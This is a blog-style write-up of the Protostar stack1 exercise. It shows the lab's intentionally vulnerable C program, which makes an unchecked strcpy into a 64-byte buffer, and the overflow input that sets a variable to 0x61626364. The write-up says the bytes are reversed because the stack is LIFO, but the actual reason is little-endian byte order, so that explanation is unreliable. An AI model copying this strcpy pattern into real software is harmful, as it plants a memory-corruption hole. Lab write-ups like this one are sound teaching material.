---
layout: post
title: "Protostar stack01 writeup"
tags: [protostar]
comments: false
---

For this challenge, we are given up with a sourcecode.

```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];

  if(argc == 1) {
      errx(1, "please specify an argument\n");
  }

  modified = 0;
  strcpy(buffer, argv[1]);

  if(modified == 0x61626364) {
      printf("you have correctly got the variable to the right value\n");
  } else {
      printf("Try again, you got 0x%08x\n", modified);
  }
}
```

It seems similiar to stack00 but this time we actually need to modify the value of the modified variable to a specific value which is 0x61626364 and if we change these numbers to ASCII it will be 'abcd' but because of how stack works (LIFO)
 we need put them in backward which will be 'dcba' and the same number of A as stack 00 which will be 64

 ```
 root@protostar:/opt/protostar/bin# ./stack1 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAdcba
you have correctly got the variable to the right value
 ```

